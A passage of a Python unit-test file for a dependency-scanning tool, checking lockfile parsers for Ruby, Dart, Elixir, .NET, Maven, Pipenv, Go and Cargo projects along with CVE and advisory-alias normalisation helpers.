                            {"name": "monolog/monolog", "version": "3.6.0"},
                        ]
                    },
                    f,
                )

            pkgs = scan.parse_composer_lock(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("monolog/monolog", "3.6.0")],
            )


class ParseGemfileLockTests(unittest.TestCase):
    def test_extracts_specs_and_skips_dependency_lines(self):
        with tempfile.TemporaryDirectory(prefix="butian-gemfile-") as root:
            with open(os.path.join(root, "Gemfile.lock"), "w", encoding="utf-8") as f:
                f.write(
                    "GEM\n"
                    "  remote: https://rubygems.org/\n"
                    "  specs:\n"
                    "    rack (2.2.8)\n"
                    "    rails (7.1.3)\n"
                    "      actionpack (= 7.1.3)\n"
                    "\n"
                    "PLATFORMS\n"
                    "  ruby\n"
                )

            pkgs = scan.parse_gemfile_lock(root)

            self.assertEqual(
                pkgs,
                [
                    {
                        "ecosystem": "rubygems",
                        "name": "rack",
                        "version": "2.2.8",
                        "is_direct": False,
                        "source": "Gemfile.lock",
                    },
                    {
                        "ecosystem": "rubygems",
                        "name": "rails",
                        "version": "7.1.3",
                        "is_direct": False,
                        "source": "Gemfile.lock",
                    },
                ],
            )

    def test_non_specs_lines_return_empty(self):
        with tempfile.TemporaryDirectory(prefix="butian-gemfile-") as root:
            with open(os.path.join(root, "Gemfile.lock"), "w", encoding="utf-8") as f:
                f.write(
                    "PATH\n"
                    "  remote: .\n"
                    "  specs:\n"
                    "    local_engine (0.1.0)\n"
                    "\n"
                    "DEPENDENCIES\n"
                    "  rack\n"
                )

            self.assertEqual(scan.parse_gemfile_lock(root), [])

    def test_strips_platform_suffix_without_changing_prerelease(self):
        with tempfile.TemporaryDirectory(prefix="butian-gemfile-") as root:
            with open(os.path.join(root, "Gemfile.lock"), "w", encoding="utf-8") as f:
                f.write(
                    "GEM\n"
                    "  specs:\n"
                    "    nokogiri (1.13.10-x86_64-linux)\n"
                    "    nokogiri (1.13.10-x86-mingw32)\n"
                    "    rails (7.1.0.beta1)\n"
                )

            pkgs = scan.parse_gemfile_lock(root)

            versions = [pkg["version"] for pkg in pkgs if pkg["name"] == "nokogiri"]
            self.assertEqual(versions, ["1.13.10"])
            self.assertEqual(
                next(pkg["version"] for pkg in pkgs if pkg["name"] == "rails"),
                "7.1.0.beta1",
            )


class ParsePubspecLockTests(unittest.TestCase):
    def test_parses_packages_with_versions(self):
        with tempfile.TemporaryDirectory(prefix="butian-pubspec-") as root:
            with open(os.path.join(root, "pubspec.lock"), "w", encoding="utf-8") as f:
                f.write(
                    "packages:\n"
                    "  collection:\n"
                    "    dependency: transitive\n"
                    "    description:\n"
                    "      name: collection\n"
                    '      url: "https://pub.dev"\n'
                    "    source: hosted\n"
                    '    version: "1.18.0"\n'
                    "  path:\n"
                    "    dependency: transitive\n"
                    "    description:\n"
                    "      name: path\n"
                    '      url: "https://pub.dev"\n'
                    "    source: hosted\n"
                    "    version: 1.9.0\n"
                )

            pkgs = scan.parse_pubspec_lock(root)

            self.assertEqual(
                pkgs,
                [
                    {
                        "ecosystem": "pub",
                        "name": "collection",
                        "version": "1.18.0",
                        "is_direct": False,
                        "source": "pubspec.lock",
                    },
                    {
                        "ecosystem": "pub",
                        "name": "path",
                        "version": "1.9.0",
                        "is_direct": False,
                        "source": "pubspec.lock",
                    },
                ],
            )

    def test_skips_missing_version(self):
        with tempfile.TemporaryDirectory(prefix="butian-pubspec-") as root:
            with open(os.path.join(root, "pubspec.lock"), "w", encoding="utf-8") as f:
                f.write(
                    "packages:\n"
                    "  collection:\n"
                    "    source: hosted\n"
                    "  path:\n"
                    "    source: hosted\n"
                    '    version: "1.9.0"\n'
                )

            pkgs = scan.parse_pubspec_lock(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("path", "1.9.0")],
            )

    def test_skips_non_hosted_packages(self):
        with tempfile.TemporaryDirectory(prefix="butian-pubspec-") as root:
            with open(os.path.join(root, "pubspec.lock"), "w", encoding="utf-8") as f:
                f.write(
                    "packages:\n"
                    "  local_pkg:\n"
                    "    source: path\n"
                    '    version: "1.0.0"\n'
                    "  sdk_pkg:\n"
                    "    source: sdk\n"
                    '    version: "0.0.0"\n'
                    "  hosted_pkg:\n"
                    "    source: hosted\n"
                    '    version: "2.0.0"\n'
                )

            pkgs = scan.parse_pubspec_lock(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("hosted_pkg", "2.0.0")],
            )


class ParseMixLockTests(unittest.TestCase):
    def test_parses_hex_entries(self):
        with tempfile.TemporaryDirectory(prefix="butian-mix-") as root:
            with open(os.path.join(root, "mix.lock"), "w", encoding="utf-8") as f:
                f.write(
                    '%{"plug": {:hex, :plug, "1.11.0", "abcd", [:mix], [], "hexpm", "hash"},\n'
                    '  "jason": {:hex, :jason, "1.4.1", "abcd", [:mix], [], "hexpm", "hash"}}\n'
                )

            pkgs = scan.parse_mix_lock(root)

            self.assertEqual(
                pkgs,
                [
                    {
                        "ecosystem": "hex",
                        "name": "plug",
                        "version": "1.11.0",
                        "is_direct": False,
                        "source": "mix.lock",
                    },
                    {
                        "ecosystem": "hex",
                        "name": "jason",
                        "version": "1.4.1",
                        "is_direct": False,
                        "source": "mix.lock",
                    },
                ],
            )

    def test_skips_non_hex_entries(self):
        with tempfile.TemporaryDirectory(prefix="butian-mix-") as root:
            with open(os.path.join(root, "mix.lock"), "w", encoding="utf-8") as f:
                f.write(
                    '%{"plug": {:hex, :plug, "1.11.0", "abcd", [:mix], [], "hexpm", "hash"},\n'
                    '  "local_dep": {:git, "https://example.com/local_dep.git", "abc"}}\n'
                )

            pkgs = scan.parse_mix_lock(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("plug", "1.11.0")],
            )


class ParseNugetTests(unittest.TestCase):
    def test_packages_lock_json_parses_direct_and_transitive_packages(self):
        with tempfile.TemporaryDirectory(prefix="butian-nuget-lock-") as root:
            with open(
                os.path.join(root, "packages.lock.json"), "w", encoding="utf-8"
            ) as f:
                json.dump(
                    {
                        "version": 1,
                        "dependencies": {
                            "net8.0": {
                                "Newtonsoft.Json": {
                                    "type": "Direct",
                                    "resolved": "13.0.3",
                                },
                                "System.Text.Json": {
                                    "type": "Transitive",
                                    "resolved": "8.0.4",
                                },
                            }
                        },
                    },
                    f,
                )

            pkgs = scan.parse_nuget(root)

            self.assertEqual(
                pkgs,
                [
                    {
                        "ecosystem": "nuget",
                        "name": "Newtonsoft.Json",
                        "version": "13.0.3",
                        "is_direct": True,
                        "source": "packages.lock.json",
                    },
                    {
                        "ecosystem": "nuget",
                        "name": "System.Text.Json",
                        "version": "8.0.4",
                        "is_direct": False,
                        "source": "packages.lock.json",
                    },
                ],
            )

    def test_packages_config_parses_packages(self):
        with tempfile.TemporaryDirectory(prefix="butian-nuget-config-") as root:
            with open(
                os.path.join(root, "packages.config"), "w", encoding="utf-8"
            ) as f:
                f.write(
                    '<?xml version="1.0" encoding="utf-8"?>\n'
                    "<packages>\n"
                    '  <package id="NUnit" version="3.14.0" />\n'
                    '  <package id="Moq" version="4.20.70" />\n'
                    "</packages>\n"
                )

            pkgs = scan.parse_nuget(root)

            self.assertEqual(
                pkgs,
                [
                    {
                        "ecosystem": "nuget",
                        "name": "NUnit",
                        "version": "3.14.0",
                        "is_direct": True,
                        "source": "packages.config",
                    },
                    {
                        "ecosystem": "nuget",
                        "name": "Moq",
                        "version": "4.20.70",
                        "is_direct": True,
                        "source": "packages.config",
                    },
                ],
            )

    def test_packages_lock_json_direct_dependency_wins_across_targets(self):
        with tempfile.TemporaryDirectory(prefix="butian-nuget-lock-") as root:
            with open(
                os.path.join(root, "packages.lock.json"), "w", encoding="utf-8"
            ) as f:
                json.dump(
                    {
                        "version": 1,
                        "dependencies": {
                            "net6.0": {
                                "Shared.Package": {
                                    "type": "Transitive",
                                    "resolved": "1.2.3",
                                }
                            },
                            "net8.0": {
                                "Shared.Package": {
                                    "type": "Direct",
                                    "resolved": "1.2.3",
                                }
                            },
                        },
                    },
                    f,
                )

            pkgs = scan.parse_nuget(root)

            self.assertEqual(len(pkgs), 1)
            self.assertEqual(pkgs[0]["name"], "Shared.Package")
            self.assertTrue(pkgs[0]["is_direct"])

    def test_skips_missing_versions(self):
        with tempfile.TemporaryDirectory(prefix="butian-nuget-missing-") as root:
            with open(
                os.path.join(root, "packages.lock.json"), "w", encoding="utf-8"
            ) as f:
                json.dump(
                    {
                        "dependencies": {
                            "net8.0": {
                                "Missing.Version": {"type": "Direct"},
                                "Present.Version": {
                                    "type": "Transitive",
                                    "resolved": "1.2.3",
                                },
                            }
                        }
                    },
                    f,
                )
            with open(
                os.path.join(root, "packages.config"), "w", encoding="utf-8"
            ) as f:
                f.write(
                    "<packages>\n"
                    '  <package id="Also.Missing" />\n'
                    '  <package id="Config.Present" version="4.5.6" />\n'
                    "</packages>\n"
                )

            pkgs = scan.parse_nuget(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("Present.Version", "1.2.3"), ("Config.Present", "4.5.6")],
            )


class ParseMavenPomTests(unittest.TestCase):
    def test_parses_direct_dependency_versions(self):
        with tempfile.TemporaryDirectory(prefix="butian-maven-pom-") as root:
            with open(os.path.join(root, "pom.xml"), "w", encoding="utf-8") as f:
                f.write(
                    "<project>\n"
                    "  <dependencies>\n"
                    "    <dependency>\n"
                    "      <groupId>org.springframework</groupId>\n"
                    "      <artifactId>spring-core</artifactId>\n"
                    "      <version>6.1.14</version>\n"
                    "    </dependency>\n"
                    "    <dependency>\n"
                    "      <groupId>com.fasterxml.jackson.core</groupId>\n"
                    "      <artifactId>jackson-databind</artifactId>\n"
                    "      <version>2.17.2</version>\n"
                    "    </dependency>\n"
                    "  </dependencies>\n"
                    "</project>\n"
                )

            pkgs = scan.parse_maven_pom(root)

            self.assertEqual(
                pkgs,
                [
                    {
                        "ecosystem": "maven",
                        "name": "org.springframework:spring-core",
                        "version": "6.1.14",
                        "is_direct": True,
                        "source": "pom.xml",
                    },
                    {
                        "ecosystem": "maven",
                        "name": "com.fasterxml.jackson.core:jackson-databind",
                        "version": "2.17.2",
                        "is_direct": True,
                        "source": "pom.xml",
                    },
                ],
            )

    def test_resolves_simple_property_versions_and_skips_ranges(self):
        with tempfile.TemporaryDirectory(prefix="butian-maven-pom-") as root:
            with open(os.path.join(root, "pom.xml"), "w", encoding="utf-8") as f:
                f.write(
                    "<project>\n"
                    "  <properties>\n"
                    "    <example.version>1.2.3</example.version>\n"
                    "  </properties>\n"
                    "  <dependencies>\n"
                    "    <dependency>\n"
                    "      <groupId>org.example</groupId>\n"
                    "      <artifactId>from-property</artifactId>\n"
                    "      <version>${example.version}</version>\n"
                    "    </dependency>\n"
                    "    <dependency>\n"
                    "      <groupId>org.example</groupId>\n"
                    "      <artifactId>range</artifactId>\n"
                    "      <version>[1.0,2.0)</version>\n"
                    "    </dependency>\n"
                    "    <dependency>\n"
                    "      <groupId>org.example</groupId>\n"
                    "      <artifactId>exact</artifactId>\n"
                    "      <version>1.0.0-RC1</version>\n"
                    "    </dependency>\n"
                    "  </dependencies>\n"
                    "</project>\n"
                )

            pkgs = scan.parse_maven_pom(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [
                    ("org.example:from-property", "1.2.3"),
                    ("org.example:exact", "1.0.0-RC1"),
                ],
            )

    def test_resolves_versions_from_dependency_management_for_direct_dependencies(self):
        with tempfile.TemporaryDirectory(prefix="butian-maven-pom-") as root:
            with open(os.path.join(root, "pom.xml"), "w", encoding="utf-8") as f:
                f.write(
                    "<project>\n"
                    "  <dependencyManagement>\n"
                    "    <dependencies>\n"
                    "      <dependency>\n"
                    "        <groupId>org.example</groupId>\n"
                    "        <artifactId>managed-direct</artifactId>\n"
                    "        <version>2.3.4</version>\n"
                    "      </dependency>\n"
                    "      <dependency>\n"
                    "        <groupId>org.example</groupId>\n"
                    "        <artifactId>managed-only</artifactId>\n"
                    "        <version>9.9.9</version>\n"
                    "      </dependency>\n"
                    "    </dependencies>\n"
                    "  </dependencyManagement>\n"
                    "  <dependencies>\n"
                    "    <dependency>\n"
                    "      <groupId>org.example</groupId>\n"
                    "      <artifactId>managed-direct</artifactId>\n"
                    "    </dependency>\n"
                    "  </dependencies>\n"
                    "</project>\n"
                )

            pkgs = scan.parse_maven_pom(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("org.example:managed-direct", "2.3.4")],
            )

    def test_parses_namespaced_pom(self):
        with tempfile.TemporaryDirectory(prefix="butian-maven-pom-") as root:
            with open(os.path.join(root, "pom.xml"), "w", encoding="utf-8") as f:
                f.write(
                    '<project xmlns="http://maven.apache.org/POM/4.0.0">\n'
                    "  <dependencies>\n"
                    "    <dependency>\n"
                    "      <groupId>junit</groupId>\n"
                    "      <artifactId>junit</artifactId>\n"
                    "      <version>4.13.2</version>\n"
                    "    </dependency>\n"
                    "  </dependencies>\n"
                    "</project>\n"
                )

            pkgs = scan.parse_maven_pom(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("junit:junit", "4.13.2")],
            )

    def test_only_parses_project_direct_dependencies(self):
        with tempfile.TemporaryDirectory(prefix="butian-maven-pom-") as root:
            with open(os.path.join(root, "pom.xml"), "w", encoding="utf-8") as f:
                f.write(
                    "<project>\n"
                    "  <dependencies>\n"
                    "    <dependency>\n"
                    "      <groupId>org.example</groupId>\n"
                    "      <artifactId>direct</artifactId>\n"
                    "      <version>1.0.0</version>\n"
                    "    </dependency>\n"
                    "  </dependencies>\n"
                    "  <dependencyManagement>\n"
                    "    <dependencies>\n"
                    "      <dependency>\n"
                    "        <groupId>org.example</groupId>\n"
                    "        <artifactId>managed</artifactId>\n"
                    "        <version>2.0.0</version>\n"
                    "      </dependency>\n"
                    "    </dependencies>\n"
                    "  </dependencyManagement>\n"
                    "  <build>\n"
                    "    <plugins>\n"
                    "      <plugin>\n"
                    "        <dependencies>\n"
                    "          <dependency>\n"
                    "            <groupId>org.example</groupId>\n"
                    "            <artifactId>plugin-only</artifactId>\n"
                    "            <version>3.0.0</version>\n"
                    "          </dependency>\n"
                    "        </dependencies>\n"
                    "      </plugin>\n"
                    "    </plugins>\n"
                    "  </build>\n"
                    "  <profiles>\n"
                    "    <profile>\n"
                    "      <dependencies>\n"
                    "        <dependency>\n"
                    "          <groupId>org.example</groupId>\n"
                    "          <artifactId>profile-only</artifactId>\n"
                    "          <version>4.0.0</version>\n"
                    "        </dependency>\n"
                    "      </dependencies>\n"
                    "    </profile>\n"
                    "  </profiles>\n"
                    "</project>\n"
                )

            pkgs = scan.parse_maven_pom(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("org.example:direct", "1.0.0")],
            )

    def test_skips_unresolved_property_package_names(self):
        with tempfile.TemporaryDirectory(prefix="butian-maven-pom-") as root:
            with open(os.path.join(root, "pom.xml"), "w", encoding="utf-8") as f:
                f.write(
                    "<project>\n"
                    "  <dependencies>\n"
                    "    <dependency>\n"
                    "      <groupId>${dep.group}</groupId>\n"
                    "      <artifactId>demo</artifactId>\n"
                    "      <version>1.2.3</version>\n"
                    "    </dependency>\n"
                    "    <dependency>\n"
                    "      <groupId>org.example</groupId>\n"
                    "      <artifactId>${dep.artifact}</artifactId>\n"
                    "      <version>1.2.3</version>\n"
                    "    </dependency>\n"
                    "    <dependency>\n"
                    "      <groupId>org.example</groupId>\n"
                    "      <artifactId>direct</artifactId>\n"
                    "      <version>1.2.3</version>\n"
                    "    </dependency>\n"
                    "  </dependencies>\n"
                    "</project>\n"
                )

            pkgs = scan.parse_maven_pom(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("org.example:direct", "1.2.3")],
            )


class YarnV1DescriptorNameTests(unittest.TestCase):
    def test_simple(self):
        self.assertEqual(scan._yarn_v1_descriptor_name("lodash@^4"), "lodash")

    def test_scoped(self):
        self.assertEqual(scan._yarn_v1_descriptor_name("@babel/core@^7"), "@babel/core")

    def test_empty(self):
        self.assertEqual(scan._yarn_v1_descriptor_name(""), "")


class YarnBerryDescriptorNameTests(unittest.TestCase):
    def test_npm_protocol(self):
        self.assertEqual(
            scan._yarn_berry_descriptor_name("lodash@npm:^4.0.0"), "lodash"
        )

    def test_scoped_npm(self):
        self.assertEqual(
            scan._yarn_berry_descriptor_name("@scope/pkg@npm:1.2.3"), "@scope/pkg"
        )

    def test_empty(self):
        self.assertEqual(scan._yarn_berry_descriptor_name(""), "")


class ParsePipfileLockTests(unittest.TestCase):
    def test_default_and_develop(self):
        with tempfile.TemporaryDirectory(prefix="butian-pipfile-") as root:
            with open(os.path.join(root, "Pipfile.lock"), "w") as f:
                json.dump(
                    {
                        "default": {"flask": "==2.0.3", "requests": "==2.31.0"},
                        "develop": {"pytest": "==8.0.0"},
                    },
                    f,
                )
            pkgs = scan.parse_pipfile_lock(root)
            names = {p["name"] for p in pkgs}
            self.assertIn("flask", names)
            self.assertIn("requests", names)
            self.assertIn("pytest", names)
            flask = next(p for p in pkgs if p["name"] == "flask")
            self.assertTrue(flask["is_direct"])
            pytest_pkg = next(p for p in pkgs if p["name"] == "pytest")
            self.assertFalse(pytest_pkg["is_direct"])

    def test_dict_format_version(self):
        with tempfile.TemporaryDirectory(prefix="butian-pipfile-") as root:
            with open(os.path.join(root, "Pipfile.lock"), "w") as f:
                json.dump(
                    {
                        "default": {
                            "flask": {"version": "==2.0.3", "markers": "python >= 3.8"},
                        }
                    },
                    f,
                )
            pkgs = scan.parse_pipfile_lock(root)
            self.assertEqual(len(pkgs), 1)
            self.assertEqual(pkgs[0]["version"], "2.0.3")

    def test_skips_non_exact_versions(self):
        with tempfile.TemporaryDirectory(prefix="butian-pipfile-") as root:
            with open(os.path.join(root, "Pipfile.lock"), "w") as f:
                json.dump(
                    {
                        "default": {
                            "range": ">=2.0",
                            "compatible": {"version": "~=1.4"},
                            "exact": {"version": "==3.2.1"},
                        }
                    },
                    f,
                )

            pkgs = scan.parse_pipfile_lock(root)

            self.assertEqual(
                [(pkg["name"], pkg["version"]) for pkg in pkgs],
                [("exact", "3.2.1")],
            )

    def test_missing_file(self):
        with tempfile.TemporaryDirectory(prefix="butian-pipfile-") as root:
            self.assertEqual(scan.parse_pipfile_lock(root), [])


class ParseGoSumTests(unittest.TestCase):
    def test_deduplicates_same_name_version(self):
        with tempfile.TemporaryDirectory(prefix="butian-go-") as root:
            with open(os.path.join(root, "go.sum"), "w") as f:
                f.write(
                    "github.com/foo/bar v1.0.0 h1:abc\n"
                    "github.com/foo/bar v1.0.0/go.mod h1:def\n"
                    "github.com/baz/qux v2.0.0 h1:ghi\n"
                )
            pkgs = scan.parse_go_sum(root)
            # Same (name, version) should appear once
            keys = [(p["name"], p["version"]) for p in pkgs]
            self.assertEqual(len(keys), len(set(keys)))

    def test_strips_version_suffix_after_slash(self):
        with tempfile.TemporaryDirectory(prefix="butian-go-") as root:
            with open(os.path.join(root, "go.sum"), "w") as f:
                f.write("github.com/foo/bar v1.0.0/incompatible h1:abc\n")
            pkgs = scan.parse_go_sum(root)
            self.assertEqual(pkgs[0]["version"], "v1.0.0")

    def test_missing_file(self):
        with tempfile.TemporaryDirectory(prefix="butian-go-") as root:
            self.assertEqual(scan.parse_go_sum(root), [])


class ParseCargoLockTests(unittest.TestCase):
    def test_fallback_parser(self):
        """Test the regex-based fallback when tomllib is unavailable or fails."""
        with tempfile.TemporaryDirectory(prefix="butian-cargo-") as root:
            with open(os.path.join(root, "Cargo.lock"), "w") as f:
                f.write(
                    "# This file is automatically @generated by Cargo.\n"
                    "[[package]]\n"
                    'name = "serde"\n'
                    'version = "1.0.198"\n'
                    'source = "registry+https://github.com/rust-lang/crates.io-index"\n'
                    "\n"
                    "[[package]]\n"
                    'name = "my-local"\n'
                    'version = "0.1.0"\n'
                    # No source means local crate, which fallback parsing excludes.
                )
            pkgs = scan.parse_cargo_lock(root)
            # tomllib path may or may not be available; if not, fallback runs
            names = [p["name"] for p in pkgs]
            self.assertIn("serde", names)


class DetectEcosystemsTests(unittest.TestCase):
    def test_no_lockfiles(self):
        with tempfile.TemporaryDirectory(prefix="butian-eco-") as root:
            ecosystems, lockfiles = scan.detect_ecosystems(root)
            self.assertEqual(ecosystems, [])
            self.assertEqual(lockfiles, {})

    def test_multiple_ecosystems(self):
        with tempfile.TemporaryDirectory(prefix="butian-eco-") as root:
            for name in ["package-lock.json", "go.sum"]:
                with open(os.path.join(root, name), "w") as f:
                    f.write("")
            ecosystems, lockfiles = scan.detect_ecosystems(root)
            self.assertEqual(sorted(ecosystems), ["go", "npm"])
            self.assertEqual(lockfiles["npm"], "package-lock.json")
            self.assertEqual(lockfiles["go"], "go.sum")


class ExtractPackagesTests(unittest.TestCase):
    def test_deduplicates_across_parsers(self):
        """parse_pypi runs multiple sub-parsers; extract_packages dedupes."""
        with tempfile.TemporaryDirectory(prefix="butian-extract-") as root:
            with open(os.path.join(root, "requirements.txt"), "w") as f:
                f.write("flask==2.0.3\n")
            # parse_pypi will return from requirements.txt
            pkgs = scan.extract_packages(root, ["pypi"])
            # Should not duplicate even if called multiple times
            keys = [(p["ecosystem"], p["name"], p["version"]) for p in pkgs]
            self.assertEqual(len(keys), len(set(keys)))

    def test_unknown_ecosystem_skipped(self):
        with tempfile.TemporaryDirectory(prefix="butian-extract-") as root:
            pkgs = scan.extract_packages(root, ["unknown-eco"])
            self.assertEqual(pkgs, [])

    def test_extracts_packagist_and_rubygems_packages(self):
        with tempfile.TemporaryDirectory(prefix="butian-extract-") as root:
            with open(os.path.join(root, "composer.lock"), "w", encoding="utf-8") as f:
                json.dump(
                    {"packages": [{"name": "symfony/console", "version": "v6.4.8"}]},
                    f,
                )
            with open(os.path.join(root, "Gemfile.lock"), "w", encoding="utf-8") as f:
                f.write("GEM\n  specs:\n    rack (2.2.8)\n")

            pkgs = scan.extract_packages(root, ["packagist", "rubygems"])

            self.assertEqual(
                [(pkg["ecosystem"], pkg["name"], pkg["version"]) for pkg in pkgs],
                [
                    ("packagist", "symfony/console", "6.4.8"),
                    ("rubygems", "rack", "2.2.8"),
                ],
            )

    def test_extracts_pub_and_hex_packages(self):
        with tempfile.TemporaryDirectory(prefix="butian-extract-") as root:
            with open(os.path.join(root, "pubspec.lock"), "w", encoding="utf-8") as f:
                f.write(
                    "packages:\n"
                    "  collection:\n"
                    "    source: hosted\n"
                    '    version: "1.18.0"\n'
                )
            with open(os.path.join(root, "mix.lock"), "w", encoding="utf-8") as f:
                f.write(
                    '%{"plug": {:hex, :plug, "1.11.0", "abcd", [:mix], [], "hexpm", "hash"}}\n'
                )

            pkgs = scan.extract_packages(root, ["pub", "hex"])

            self.assertEqual(
                [(pkg["ecosystem"], pkg["name"], pkg["version"]) for pkg in pkgs],
                [
                    ("pub", "collection", "1.18.0"),
                    ("hex", "plug", "1.11.0"),
                ],
            )

    def test_extracts_nuget_packages(self):
        with tempfile.TemporaryDirectory(prefix="butian-extract-") as root:
            with open(
                os.path.join(root, "packages.lock.json"), "w", encoding="utf-8"
            ) as f:
                json.dump(
                    {
                        "dependencies": {
                            "net8.0": {
                                "Newtonsoft.Json": {
                                    "type": "Direct",
                                    "resolved": "13.0.3",
                                }
                            }
                        }
                    },
                    f,
                )

            pkgs = scan.extract_packages(root, ["nuget"])

            self.assertEqual(
                [(pkg["ecosystem"], pkg["name"], pkg["version"]) for pkg in pkgs],
                [("nuget", "Newtonsoft.Json", "13.0.3")],
            )

    def test_extracts_maven_packages(self):
        with tempfile.TemporaryDirectory(prefix="butian-extract-") as root:
            with open(os.path.join(root, "pom.xml"), "w", encoding="utf-8") as f:
                f.write(
                    "<project>\n"
                    "  <dependencies>\n"
                    "    <dependency>\n"
                    "      <groupId>org.apache.commons</groupId>\n"
                    "      <artifactId>commons-lang3</artifactId>\n"
                    "      <version>3.14.0</version>\n"
                    "    </dependency>\n"
                    "  </dependencies>\n"
                    "</project>\n"
                )

            pkgs = scan.extract_packages(root, ["maven"])

            self.assertEqual(
                [(pkg["ecosystem"], pkg["name"], pkg["version"]) for pkg in pkgs],
                [("maven", "org.apache.commons:commons-lang3", "3.14.0")],
            )

    def test_extracts_all_expanded_language_ecosystems_together(self):
        with tempfile.TemporaryDirectory(prefix="butian-extract-") as root:
            with open(os.path.join(root, "composer.lock"), "w", encoding="utf-8") as f:
                json.dump(
                    {"packages": [{"name": "symfony/console", "version": "v6.4.8"}]},
                    f,
                )
            with open(os.path.join(root, "Gemfile.lock"), "w", encoding="utf-8") as f:
                f.write("GEM\n  specs:\n    rack (2.2.8)\n")
            with open(os.path.join(root, "pubspec.lock"), "w", encoding="utf-8") as f:
                f.write(
                    "packages:\n"
                    "  collection:\n"
                    "    source: hosted\n"
                    '    version: "1.18.0"\n'
                )
            with open(os.path.join(root, "mix.lock"), "w", encoding="utf-8") as f:
                f.write(
                    '%{"plug": {:hex, :plug, "1.11.0", "abcd", [:mix], [], "hexpm", "hash"}}\n'
                )
            with open(
                os.path.join(root, "packages.config"), "w", encoding="utf-8"
            ) as f:
                f.write(
                    '<packages><package id="NUnit" version="3.14.0" /></packages>\n'
                )
            with open(os.path.join(root, "pom.xml"), "w", encoding="utf-8") as f:
                f.write(
                    "<project><dependencies><dependency>"
                    "<groupId>org.apache.commons</groupId>"
                    "<artifactId>commons-lang3</artifactId>"
                    "<version>3.14.0</version>"
                    "</dependency></dependencies></project>"
                )

            pkgs = scan.extract_packages(
                root, ["packagist", "rubygems", "pub", "hex", "nuget", "maven"]
            )

            keys = {(pkg["ecosystem"], pkg["name"], pkg["version"]) for pkg in pkgs}
            self.assertEqual(
                keys,
                {
                    ("packagist", "symfony/console", "6.4.8"),
                    ("rubygems", "rack", "2.2.8"),
                    ("pub", "collection", "1.18.0"),
                    ("hex", "plug", "1.11.0"),
                    ("nuget", "NUnit", "3.14.0"),
                    ("maven", "org.apache.commons:commons-lang3", "3.14.0"),
                },
            )


class PackageSourceSummaryTests(unittest.TestCase):
    def test_counts_by_ecosystem_and_source(self):
        packages = [
            {
                "ecosystem": "npm",
                "source": "package-lock.json",
                "name": "a",
                "version": "1.0",
            },
            {
                "ecosystem": "npm",
                "source": "package-lock.json",
                "name": "b",
                "version": "2.0",
            },
            {
                "ecosystem": "pypi",
                "source": "requirements.txt",
                "name": "c",
                "version": "3.0",
            },
        ]
        summary = scan.package_source_summary(packages)
        npm_entry = next(s for s in summary if s["ecosystem"] == "npm")
        self.assertEqual(npm_entry["count"], 2)
        pypi_entry = next(s for s in summary if s["ecosystem"] == "pypi")
        self.assertEqual(pypi_entry["count"], 1)

    def test_empty_packages(self):
        self.assertEqual(scan.package_source_summary([]), [])


class PackageVersionIndexTests(unittest.TestCase):
    def test_builds_index(self):
        packages = [
            {"ecosystem": "npm", "name": "lodash", "version": "4.17.21"},
            {"ecosystem": "pypi", "name": "flask", "version": "2.0.3"},
        ]
        index = scan.package_version_index(packages)
        self.assertEqual(index[("npm", "lodash")], "4.17.21")
        self.assertEqual(index[("pypi", "flask")], "2.0.3")

    def test_keeps_first_occurrence(self):
        packages = [
            {"ecosystem": "npm", "name": "lodash", "version": "4.17.20"},
            {"ecosystem": "npm", "name": "lodash", "version": "4.17.21"},
        ]
        index = scan.package_version_index(packages)
        self.assertEqual(index[("npm", "lodash")], "4.17.20")

    def test_skips_missing_fields(self):
        packages = [
            {"ecosystem": "npm", "name": "", "version": "1.0"},
            {"ecosystem": "", "name": "foo", "version": "1.0"},
        ]
        index = scan.package_version_index(packages)
        self.assertEqual(len(index), 0)


class CurrentVersionForTests(unittest.TestCase):
    def test_found(self):
        index = {("npm", "lodash"): "4.17.21"}
        self.assertEqual(scan.current_version_for(index, "npm", "lodash"), "4.17.21")

    def test_not_found(self):
        self.assertEqual(scan.current_version_for({}, "npm", "lodash"), "")

    def test_none_inputs(self):
        self.assertEqual(scan.current_version_for(None, None, None), "")


class NormalizeCveIdTests(unittest.TestCase):
    def test_valid_cve(self):
        self.assertEqual(scan.normalize_cve_id("cve-2024-1234"), "CVE-2024-1234")

    def test_already_uppercase(self):
        self.assertEqual(scan.normalize_cve_id("CVE-2024-1234"), "CVE-2024-1234")

    def test_invalid_format(self):
        self.assertEqual(scan.normalize_cve_id("GHSA-xxxx-xxxx-xxxx"), "")

    def test_none(self):
        self.assertEqual(scan.normalize_cve_id(None), "")

    def test_short_year(self):
        self.assertEqual(scan.normalize_cve_id("CVE-24-123"), "")


class ExtractCveAliasesTests(unittest.TestCase):
    def test_extracts_cves(self):
        result = scan.extract_cve_aliases(
            ["CVE-2024-0001", "GHSA-xxxx-xxxx-xxxx", "CVE-2024-0001"]
        )
        self.assertEqual(result, ["CVE-2024-0001"])

    def test_empty(self):
        self.assertEqual(scan.extract_cve_aliases([]), [])
        self.assertEqual(scan.extract_cve_aliases(None), [])


class BestAdvisoryAliasTests(unittest.TestCase):
    def test_prefers_cve(self):
        self.assertEqual(
            scan.best_advisory_alias(["GHSA-xxxx-xxxx-xxxx", "CVE-2024-0001"]),
            "CVE-2024-0001",
        )

    def test_falls_back_to_non_ghsa(self):
        self.assertEqual(
            scan.best_advisory_alias(["GHSA-xxxx-xxxx-xxxx", "OSV-2024-1"]),
            "OSV-2024-1",
        )

    def test_ghsa_only(self):
        self.assertEqual(
            scan.best_advisory_alias(["GHSA-xxxx-xxxx-xxxx"]),
            "GHSA-xxxx-xxxx-xxxx",
        )

    def test_empty(self):
        self.assertEqual(scan.best_advisory_alias([]), "")


class NormalizedEcosystemTests(unittest.TestCase):
    def test_python(self):
        self.assertEqual(scan.normalized_ecosystem("python"), "pypi")

    def test_rust_variants(self):
